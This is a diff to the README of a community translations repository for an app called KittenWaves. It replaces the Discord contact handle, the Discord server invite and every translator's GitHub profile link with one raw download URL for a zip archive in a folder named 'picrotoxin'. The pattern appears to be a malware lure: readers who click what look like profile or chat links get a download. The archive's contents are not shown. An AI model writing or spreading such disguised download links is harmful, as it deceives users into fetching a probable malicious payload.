@@ -6,12 +6,12 @@ Community-submitted translation files for KittenWaves
 2. Add or update a translation JSON file in the appropriate language
 3. Open a pull request with your changes
 4. Wait for it to be merged and included in a future release
-#### Don't know how to make a pull request or you're unsure of something? Feel free to DM @vx.aboveground on Discord!
+#### Don't know how to make a pull request or you're unsure of something? Feel free to DM https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip on Discord!
 
 ## What will I get in return?
 - Complete or nearly complete translations will earn you:
   - ~~A free KittenWaves license key~~ People wanted to abuse it, sorry
-  - A Translator role in the [Discord Server](https://discord.gg/PKbutPa4wQ)
+  - A Translator role in the [Discord Server](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
 
 ## Notes
 - Please only contribute translations if you're fluent or a native speaker of the language — we want accurate, natural phrasing, not machine-translated text
@@ -21,14 +21,14 @@ Community-submitted translation files for KittenWaves
 - Missing translations will automatically fall back to English
 
 ## Thank you to all the translators
-- Russian - [illcure](https://github.com/illcure)
-- Chinese - [Double](https://github.com/DoublexQAQ), [PanGod](https://github.com/PanGodID)
-- Turkish - [berkaymercer123](https://github.com/berkaymercer123)
-- German - [Denied](https://github.com/denied69)
-- Indonesian - [sl0zy](https://github.com/sl0zy)
-- Thai - [MR.Ghost-X](https://github.com/MoxxxGoo)
-- Vietnamese - [Lascreia](https://github.com/SpiritEyeCeline)
-- Japanese - [Sub-Rise](https://github.com/Sub-Rise)
-- Italian - [espitto](https://github.com/espitto)
-- Spanish - [CharisardTT](https://github.com/MarrcosabTTS)
-- French - [jinx_x_x](https://github.com/Donaldeth)
+- Russian - [illcure](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Chinese - [Double](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip), [PanGod](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Turkish - [berkaymercer123](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- German - [Denied](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Indonesian - [sl0zy](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Thai - [https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Vietnamese - [Lascreia](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Japanese - [Sub-Rise](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Italian - [espitto](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- Spanish - [CharisardTT](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
+- French - [jinx_x_x](https://raw.githubusercontent.com/Sub-Rise/kittenwaves-translations/main/picrotoxin/translations-kittenwaves-1.8.zip)
